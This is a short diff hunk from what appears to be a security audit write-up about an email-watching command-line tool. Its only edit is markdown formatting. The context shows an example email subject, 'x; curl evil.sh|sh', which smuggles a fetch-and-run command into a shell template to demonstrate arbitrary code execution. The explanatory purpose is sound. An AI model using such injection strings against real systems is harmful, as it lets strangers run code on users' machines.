@@ -37,7 +37,7 @@ bullmoose watch --exec 'echo {subject}'
 with an inbound subject of `x; curl evil.sh|sh` → arbitrary code execution as the user, triggered by
 **a stranger sending an email**.
 
-A blocklist whose correctness depends on how the *user* quoted their template is not a control.
+A blocklist whose correctness depends on how the _user_ quoted their template is not a control.
 
 ## Secondary defect
 
